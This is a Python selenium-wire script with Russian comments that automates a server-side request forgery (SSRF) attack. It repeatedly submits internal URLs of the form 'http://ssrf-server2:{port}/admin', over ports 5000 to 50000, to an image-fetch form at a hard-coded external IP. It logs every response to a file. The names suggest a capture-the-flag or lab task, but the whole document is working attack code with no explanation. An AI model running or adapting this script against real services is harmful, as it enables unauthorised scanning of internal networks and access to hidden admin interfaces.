from seleniumwire import webdriver  # Обратите внимание: seleniumwire, а не selenium
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import time

options = webdriver.ChromeOptions()
options.add_argument('--headless')
#options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')

# Настройки заголовков для всех запросов
selenium_wire_options = {
    'headers': {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        # Добавьте другие заголовки при необходимости
        # 'Referer': 'http://example.com',
        # 'Accept': 'image/webp,image/apng,image/*,*/*'
    }
}

driver = webdriver.Chrome(
    options=options,
    seleniumwire_options=selenium_wire_options
)

html_form = """
<form action="http://62.173.140.174:36103/fetch" method="POST">
  <input type="text" id="url" name="url" class="form-control" placeholder="https://example.com/image.jpg" required="">
  <button type="submit" class="btn">🚀 Fetch Image</button>
</form>
"""

'''html_form = """
<form action="http://62.173.140.174:36103/fetch" method="POST">
  <input type="text" id="url" name="url" class="form-control" placeholder="https://example.com/image.jpg" required="">
  <button type="submit" class="btn">🚀 Fetch Image</button>
</form>
<script>
  document.forms[0].submit();
</script>
"""
'''
driver.get("data:text/html;charset=utf-8," + html_form)

# Генерация URL: photot-5000, photot-5001, ...
start_num = 5000
end_num = 50000  # меняем на нужное конечное число

for num in range(start_num, end_num + 1):
    img_url = f"http://ssrf-server2:{num}/admin"
    try:
        # Находим поле ввода и вставляем ссылку
        input_field = driver.find_element(By.ID, "url")
        input_field.clear()
        input_field.send_keys(img_url)

        # Нажимаем кнопку отправки
        submit_btn = driver.find_element(By.CSS_SELECTOR, "button.btn")
        submit_btn.click()

        # Ждём загрузки страницы (настройте под свой случай)
        time.sleep(1)

        # Получаем HTML текущей страницы
        page_html = driver.page_source

        # Выводим в консоль результат запроса
        print(f"\n--- Результат для {img_url} ---")
        print(page_html)
        print("-" * 50)
        
        with open('task11.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n--- Результат для {img_url} ---\n")
            f.write(page_html)
            f.write("\n" + "-" * 50 + "\n")

        # Возвращаемся к форме для следующего запроса
        driver.get("data:text/html;charset=utf-8," + html_form)
        time.sleep(1)  # пауза между запросами

    except (NoSuchElementException, TimeoutException) as e:
        print(f"Ошибка при обработке {img_url}: {e}")
    except Exception as e:
        print(f"Неожиданная ошибка для {img_url}: {e}")

# Закрываем браузер
driver.quit()